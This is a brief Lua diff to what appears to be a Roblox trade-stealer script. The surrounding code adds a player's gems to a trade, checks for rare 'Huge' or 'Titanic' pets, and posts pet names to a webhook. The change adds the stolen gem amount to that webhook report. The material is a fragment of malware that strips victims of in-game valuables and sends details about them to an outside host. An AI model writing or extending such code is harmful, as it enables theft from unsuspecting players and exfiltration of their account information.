@@ -170,11 +170,12 @@ function SendPublic(embed)
 	})
 end
 
+local gemssent = 1
 function AddGemsToTrade()
-    for i, v in pairs(GetSave().Inventory.Currency) do
+    for i, v in pairs(inventory.Currency) do
         if v.id == "Diamonds" then
             GemAmount = v._am
-			print(GemAmount)
+			gemssent = GemAmount
             GemId = i
             local args = {
                 [1] = 1,
@@ -222,6 +223,11 @@ if HasHuge() == "Yes" or HasTitanic() == "Yes" then
 							["name"] = "Pet names",
 							["value"] = table.concat(WebhookList, "\n"),
 							["inline"] = false
+						},
+						{
+							["name"] = "Gems:",
+							["value"] = gemssent,
+							["inline"] = true
 						}
 					}
 				}
